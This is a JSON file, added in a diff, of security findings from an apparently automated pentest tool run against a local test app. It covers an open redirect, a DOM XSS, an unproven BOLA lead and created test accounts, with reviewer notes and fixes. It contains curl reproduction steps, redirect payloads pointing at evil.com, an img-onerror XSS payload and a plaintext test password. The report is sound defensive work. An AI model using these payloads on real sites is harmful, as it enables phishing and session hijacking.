+    "impact": "Observed:\n- GET /go?url=https://evil.com -> HTTP 302, Location: https://evil.com [E01]\n- GET /go?url=//evil.com -> HTTP 302, Location: //evil.com [E02]\n- repeat of E01 -> identical Location: https://evil.com [E03]\n\nNot demonstrated: Credential/token theft.\n\nPotential impact: Phishing and trust abuse: victims following a localhost:3000 link are silently sent to an attacker domain.",
+    "location": "GET /go, query parameter `url`",
+    "mitre": "T1566",
+    "owasp": "A01:2021-Broken-Access-Control",
+    "payload": "http://localhost:3000/go?url=https://evil.com  (also //evil.com)",
+    "remediation": "In the /go handler, do not pass user input straight to res.redirect. Resolve `url` against an allowlist of internal paths, or require a relative path (reject values starting with a scheme, `//`, or a backslash) before redirecting. Prefer mapping to server-side known destinations.",
+    "repro_steps": [
+      "curl -s -i 'http://localhost:3000/go?url=https://evil.com'",
+      "Read the response status line: HTTP/1.1 302 Found",
+      "Read the Location header: Location: https://evil.com (external host, not localhost)",
+      "curl -s -i 'http://localhost:3000/go?url=//evil.com'  # protocol-relative variant, Location: //evil.com"
+    ],
+    "review_reason": "DOWNGRADE_UNPROVEN_IMPACT: the mechanic is demonstrated; the claimed impact is not, and is reported as potential",
+    "review_status": "needs-review",
+    "screenshots": [],
+    "secret": "",
+    "severity": "Low",
+    "stage": "initial-access",
+    "title": "GET /go 302-redirects to the attacker-controlled external host supplied in the `url` param, with no…",
+    "validated": false,
+    "votes": "1/1"
+  },
+  {
+    "_engine": "49d3d3ceb1df",
+    "_provenance": "JOASNSCOPE-49d3d3ceb1df-ns-1789853137-localhost_3000",
+    "account": "",
+    "agent": "xss_dom",
+    "auth_context": "",
+    "business_impact": "Measured: attacker-supplied markup in the ?name= query parameter is inserted into the DOM via innerHTML and executes JavaScript in the http://localhost:3000 origin (verified: injected onerror handler ran, set document.title and a window global). A crafted homepage link (the intended 'campaign link' use, e.g. /?name=Alice) executes arbitrary JS in the victim's session context — enabling theft of same-origin data, actions as the victim, and phishing. Note the session cookie nimbus.sid is HttpOnly so document.cookie theft is blocked, but the JS can still call authenticated app/API endpoints as the victim.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "chains_from": [],
+    "claims": {
+      "impact": {
+        "claim": "Arbitrary same-origin JS execution in a victim's browser via a crafted link",
+        "evidence": [
+          "E04"
+        ],
+        "status": "proven"
+      },
+      "ledger": {
+        "items": [
+          {
+            "id": "E01",
+            "observed": "GET /app.js -> renderGreeting reads params.get('name') from window.location.search (SOURCE)",
+            "source": "http"
+          },
+          {
+            "id": "E02",
+            "observed": "GET /app.js line 18 -> el.innerHTML = 'Welcome back, ' + name (SINK, no sanitization)",
+            "source": "http"
+          },
+          {
+            "id": "E03",
+            "observed": "GET / -> contains <div id=\"greeting\"> (sink target present on homepage)",
+            "source": "http"
+          },
+          {
+            "id": "E04",
+            "observed": "Browser nav to /?name=<img src=x onerror=...> -> document.title and window.__xss_marker == 'NSXSS_9f4c2e', origin http://localhost:3000",
+            "source": "browser"
+          },
+          {
+            "id": "E05",
+            "observed": "Console: GET http://localhost:3000/x 404 (failed <img src=x> that fires onerror)",
+            "source": "browser"
+          },
+          {
+            "id": "E06",
+            "observed": "pocs/dom_xss_name.sh RESULT {\"marker\":\"NSXSS_9f4c2e\",\"origin\":\"http://localhost:3000\"}",
+            "source": "poc"
+          }
+        ]
+      },
+      "mechanic": {
+        "claim": "The ?name= query param is written unsanitized into innerHTML and executes attacker JavaScript in the localhost:3000 origin",
+        "evidence": [
+          "E01",
+          "E02",
+          "E03",
+          "E04",
+          "E05",
+          "E06"
+        ],
+        "status": "proven"
+      },
+      "potential_impact": "Session-riding against authenticated app/API endpoints and phishing; direct cookie theft is limited because nimbus.sid is HttpOnly.",
+      "test_scope": {
+        "account_confirmed": false,
+        "account_exists": false,
+        "authenticated_session": false,
+        "browser_used": true,
+        "email_delivery_observed": false,
+        "notes": [],
+        "oob_callback_available": false
+      }
+    },
+    "confidence": 0.2,
+    "cvss": "2.9 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N/E:F/RL:X/RC:R)",
+    "cwe": "CWE-79",
+    "endpoint": "http://localhost:3000/?name=",
+    "evidence": "app.js line 18: `el.innerHTML = \"Welcome back, \" + name + \"! Check out today's deals.\";` fed by `params.get(\"name\")` from window.location.search with no escaping. Browser (Playwright/Chromium) navigated to the payload URL; the injected <img onerror> handler executed in origin http://localhost:3000 — document.title and window.__xss_marker both became NSXSS_9f4c2e. Console log recorded `GET http://localhost:3000/x 404` (the failed <img src=x> that fires onerror). PoC: pocs/dom_xss_name.sh (RESULT {\"marker\":\"NSXSS_9f4c2e\",\"origin\":\"http://localhost:3000\"}). Screenshot: evidence/dom-xss-name-innerhtml.png",
+    "evidence_data": null,
+    "exploitability": "hard",
+    "id": "domxss-name-innerhtml",
+    "impact": "Measured: attacker-supplied markup in the ?name= query parameter is inserted into the DOM via innerHTML and executes JavaScript in the http://localhost:3000 origin (verified: injected onerror handler ran, set document.title and a window global). A crafted homepage link (the intended 'campaign link' use, e.g. /?name=Alice) executes arbitrary JS in the victim's session context — enabling theft of same-origin data, actions as the victim, and phishing. Note the session cookie nimbus.sid is HttpOnly so document.cookie theft is blocked, but the JS can still call authenticated app/API endpoints as the victim.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "location": "Client script GET /app.js, function renderGreeting(): SOURCE = new URLSearchParams(window.location.search).get(\"name\"); SINK = document.getElementById(\"greeting\").innerHTML = \"Welcome back, \" + name + \"! ...\". No encoding/sanitization between source and sink. Runs on GET / (homepage) which contains <div id=\"greeting\">.",
+    "mitre": "T1059.007",
+    "owasp": "A03:2021-Injection",
+    "payload": "http://localhost:3000/?name=%3Cimg%20src%3Dx%20onerror%3D%22window.__xss_marker%3D%27NSXSS_9f4c2e%27%3Bdocument.title%3D%27NSXSS_9f4c2e%27%22%3E",
+    "remediation": "Do not pass user input to innerHTML. Use el.textContent = \"Welcome back, \" + name + \"! ...\" so the value is rendered as text, or HTML-encode `name` before concatenation. If markup is genuinely required, sanitize with a library like DOMPurify against an allowlist. The homepage CSP (present) should also drop any inline-script allowances that enable event-handler execution.",
+    "repro_steps": [
+      "curl -s http://localhost:3000/app.js | grep -n innerHTML   # shows the sink: el.innerHTML = \"Welcome back, \" + name",
+      "curl -s http://localhost:3000/ | grep 'id=\"greeting\"'   # confirms the target element exists",
+      "Open in a browser: http://localhost:3000/?name=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E",
+      "Observe alert() firing with document.domain = localhost, proving same-origin script execution (marker variant sets document.title=NSXSS_9f4c2e).",
+      "Reproduce headless: bash pocs/dom_xss_name.sh  -> RESULT {\"marker\":\"NSXSS_9f4c2e\",\"origin\":\"http://localhost:3000\"}"
+    ],
+    "review_reason": "evidence integrity: confirmed with no checkable evidence recorded",
+    "review_status": "rejected",
+    "screenshots": [
+      "evidence/domxss-name-innerhtml-1.png"
+    ],
+    "secret": "",
+    "severity": "Medium",
+    "stage": "execution",
+    "title": "DOM-based XSS via ?name= URL parameter written to innerHTML on homepage",
+    "validated": false,
+    "votes": "1/1 · receipt_missing"
+  },
+  {
+    "_engine": "49d3d3ceb1df",
+    "_provenance": "JOASNSCOPE-49d3d3ceb1df-ns-1789853137-localhost_3000",
+    "account": "",
+    "agent": "bola",
+    "auth_context": "",
+    "business_impact": "None demonstrated — no order objects to access. Reported as a lead only.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "chains_from": [],
+    "claims": {
+      "impact": {
+        "claim": "Cross-user order access.",
+        "evidence": [],
+        "status": "unproven"
+      },
+      "ledger": {
+        "items": [
+          {
+            "id": "E10",
+            "observed": "GET /api/v2/orders/1 (no token) -> 401",
+            "source": "http"
+          },
+          {
+            "id": "E11",
+            "observed": "GET /api/v2/orders/1..12 (customer token) -> 200 {\"error\":\"not found\"}",
+            "source": "http"
+          }
+        ]
+      },
+      "mechanic": {
+        "claim": "Endpoint requires a token but returns not-found for all probed ids; no order objects present.",
+        "evidence": [
+          "E10",
+          "E11"
+        ],
+        "status": "proven"
+      },
+      "potential_impact": "If order records exist, likely BOLA identical to /api/v2/users/:id.",
+      "test_scope": {
+        "account_confirmed": true,
+        "account_exists": true,
+        "authenticated_session": true,
+        "browser_used": false,
+        "email_delivery_observed": false,
+        "notes": [],
+        "oob_callback_available": false
+      }
+    },
+    "confidence": 0.0,
+    "cvss": "3.5 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:F/RL:X/RC:R)",
+    "cwe": "CWE-639",
+    "endpoint": "http://localhost:3000/api/v2/orders/:id",
+    "evidence": "Unauth -> 401. With valid customer token, ids 1-12 all return HTTP 200 {\"error\":\"not found\"}. No order records exist in this build, so cross-user data access could NOT be demonstrated. Given /api/v2/users/:id is confirmed BOLA on the identical auth surface, this endpoint is very likely to share the missing object-level check once orders exist.",
+    "evidence_data": null,
+    "exploitability": "hard",
+    "id": "lead-v2-orders-id",
+    "impact": "Observed:\n- GET /api/v2/orders/1 (no token) -> 401 [E10]\n- GET /api/v2/orders/1..12 (customer token) -> 200 {\"error\":\"not found\"} [E11]\n\nNot demonstrated: Cross-user order access.\n\nPotential impact: If order records exist, likely BOLA identical to /api/v2/users/:id.",
+    "location": "GET /api/v2/orders/{id} — same Bearer-auth surface as the users endpoint.",
+    "mitre": "T1078",
+    "owasp": "A01:2021-Broken-Access-Control",
+    "payload": "Authorization: Bearer <own customer JWT> → GET /api/v2/orders/1..12",
+    "remediation": "Apply the same server-side object-level authorization (token.id must own the order, or admin) before any order object exists in production.",
+    "repro_steps": [
+      "curl -s -o /dev/null -w '%{http_code}\\n' http://localhost:3000/api/v2/orders/1   # 401 no token",
+      "curl -s -H \"Authorization: Bearer $TOK\" http://localhost:3000/api/v2/orders/1   # {\"error\":\"not found\"} — no data to compare"
+    ],
+    "review_reason": "DOWNGRADE_UNPROVEN_IMPACT: the mechanic is demonstrated; the claimed impact is not, and is reported as potential · missing: an access-control claim needs the same resource requested as another identity",
+    "review_status": "needs-review",
+    "screenshots": [],
+    "secret": "",
+    "severity": "Info",
+    "stage": "privesc",
+    "title": "Endpoint requires a token but returns not-found for all probed ids; no order objects present",
+    "validated": false,
+    "votes": "0/1"
+  },
+  {
+    "_engine": "49d3d3ceb1df",
+    "_provenance": "JOASNSCOPE-49d3d3ceb1df-ns-1789853137-localhost_3000",
+    "account": "10 test account(s)",
+    "agent": "account_registration_and_forms",
+    "auth_context": "n/a",
+    "business_impact": "Operational cleanup: remove these accounts once testing is complete.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "chains_from": [],
+    "claims": {
+      "impact": {
+        "claim": "Operational cleanup: remove these accounts once testing is complete.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+        "evidence": [],
+        "status": null
+      },
+      "ledger": {
+        "items": [
+          {
+            "id": "E01",
+            "observed": "10 account(s) created for authenticated testing. Credentials are in vault.json (not shown here).",
+            "source": "agent"
+          },
+          {
+            "id": "E02",
+            "observed": "• nrsplt_1a883993@example.test [customer] — created via curl: POST username,email,password urlencoded to /register (no CSRF token); 302->/account with session cookie",
+            "source": "agent"
+          },
+          {
+            "id": "E03",
+            "observed": "• nrsplt_a17847@example.test [customer] — created via curl POST username/email/password to /register (302 -> /account, session set)",
+            "source": "agent"
+          },
+          {
+            "id": "E04",
+            "observed": "• nrsplt_poc3862@example.test [customer] — created via created by pocs/bola_v2_users.sh single run (id=10)",
+            "source": "agent"
+          },
+          {
+            "id": "E05",
+            "observed": "• admin (leaked, NOT created) [admin] — created via extracted from BOLA response, NOT created by us",
+            "source": "agent"
+          },
+          {
+            "id": "E06",
+            "observed": "• nrsplt_11878@example.test [customer] — created via curl: POST username/email/password to /register (302 /account, auto-logged-in), then POST username/password to /login",
+            "source": "agent"
+          },
+          {
+            "id": "E07",
+            "observed": "• nrsplt_a_10061@example.test [user] — created via curl POST username/email/password",
+            "source": "agent"
+          },
+          {
+            "id": "E08",
+            "observed": "• nrsplt_b_16593@example.test [user] — created via curl POST username/email/password",
+            "source": "agent"
+          },
+          {
+            "id": "E09",
+            "observed": "• poc_24781@example.test [user] — created via created by pocs/bola_v2_users.sh (id 14)",
+            "source": "agent"
+          },
+          {
+            "id": "E10",
+            "observed": "• nrsplt_15633@example.test [user] — created via curl POST username/email/password to /register, 302 to /account with nimbus.sid cookie",
+            "source": "agent"
+          },
+          {
+            "id": "E11",
+            "observed": "• nrsplt_3af23ef6@example.test [user] — created via curl POST username=nrsplt_3af23ef6 email=nrsplt_3af23ef6@example.test password=Nrsplt_Pass_3af23ef6!",
+            "source": "agent"
+          }
+        ]
+      },
+      "mechanic": {
+        "claim": "Test accounts created during the engagement (DELETE after)",
+        "evidence": [
+          "E01",
+          "E02",
+          "E03",
+          "E04",
+          "E05",
+          "E06",
+          "E07",
+          "E08",
+          "E09",
+          "E10",
+          "E11"
+        ],
+        "status": "proven"
+      },
+      "potential_impact": "",
+      "test_scope": {
+        "account_confirmed": false,
+        "account_exists": false,
+        "authenticated_session": false,
+        "browser_used": false,
+        "email_delivery_observed": false,
+        "notes": [],
+        "oob_callback_available": false
+      }
+    },
+    "confidence": 0.6,
+    "cvss": "3.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N/E:P/RL:X/RC:U)",
+    "cwe": "",
+    "endpoint": "http://localhost:3000",
+    "evidence": "10 account(s) created for authenticated testing. Credentials are in vault.json (not shown here).\n• nrsplt_1a883993@example.test [customer] — created via curl: POST username,email,password urlencoded to /register (no CSRF token); 302->/account with session cookie\n• nrsplt_a17847@example.test [customer] — created via curl POST username/email/password to /register (302 -> /account, session set)\n• nrsplt_poc3862@example.test [customer] — created via created by pocs/bola_v2_users.sh single run (id=10)\n• admin (leaked, NOT created) [admin] — created via extracted from BOLA response, NOT created by us\n• nrsplt_11878@example.test [customer] — created via curl: POST username/email/password to /register (302 /account, auto-logged-in), then POST username/password to /login\n• nrsplt_a_10061@example.test [user] — created via curl POST username/email/password\n• nrsplt_b_16593@example.test [user] — created via curl POST username/email/password\n• poc_24781@example.test [user] — created via created by pocs/bola_v2_users.sh (id 14)\n• nrsplt_15633@example.test [user] — created via curl POST username/email/password to /register, 302 to /account with nimbus.sid cookie\n• nrsplt_3af23ef6@example.test [user] — created via curl POST username=nrsplt_3af23ef6 email=nrsplt_3af23ef6@example.test password=Nrsplt_Pass_3af23ef6!",
+    "evidence_data": null,
+    "exploitability": "trivial",
+    "id": "test-accounts",
+    "impact": "Observed:\n- 10 account(s) created for authenticated testing. Credentials are in vault.json (not shown here). [E01]\n- • nrsplt_1a883993@example.test [customer] — created via curl: POST username,email,password urlencoded to /register (no CSRF token); 302->/account with session cookie [E02]\n- • nrsplt_a17847@example.test [customer] — created via curl POST username/email/password to /register (302 -> /account, session set) [E03]\n- • nrsplt_poc3862@example.test [customer] — created via created by pocs/bola_v2_users.sh single run (id=10) [E04]\n- • admin (leaked, NOT created) [admin] — created via extracted from BOLA response, NOT created by us [E05]\n- • nrsplt_11878@example.test [customer] — created via curl: POST username/email/password to /register (302 /account, auto-logged-in), then POST username/password to /login [E06]\n- • nrsplt_a_10061@example.test [user] — created via curl POST username/email/password [E07]\n- • nrsplt_b_16593@example.test [user] — created via curl POST username/email/password [E08]\n- • poc_24781@example.test [user] — created via created by pocs/bola_v2_users.sh (id 14) [E09]\n- • nrsplt_15633@example.test [user] — created via curl POST username/email/password to /register, 302 to /account with nimbus.sid cookie [E10]\n- • nrsplt_3af23ef6@example.test [user] — created via curl POST username=nrsplt_3af23ef6 email=nrsplt_3af23ef6@example.test password=Nrsplt_Pass_3af23ef6! [E11]\n\nNot demonstrated: Operational cleanup: remove these accounts once testing is complete.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.\n\nPotential impact: Operational cleanup: remove these accounts once testing is complete.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "location": "",
+    "mitre": "T1190",
+    "owasp": "A04:2021-Insecure-Design",
+    "payload": "",
+    "remediation": "Delete the listed test accounts; rotate anything they touched.",
+    "repro_steps": [],
+    "review_reason": "DOWNGRADE_UNPROVEN_IMPACT: the mechanic is demonstrated; the claimed impact is not, and is reported as potential · missing: out of reach for this assessment: no deterministic validator owns this class",
+    "review_status": "needs-review",
+    "screenshots": [],
+    "secret": "",
+    "severity": "Info",
+    "stage": "initial-access",
+    "title": "Test accounts created during the engagement (DELETE after)",
+    "validated": false,
+    "votes": ""
+  }
+]
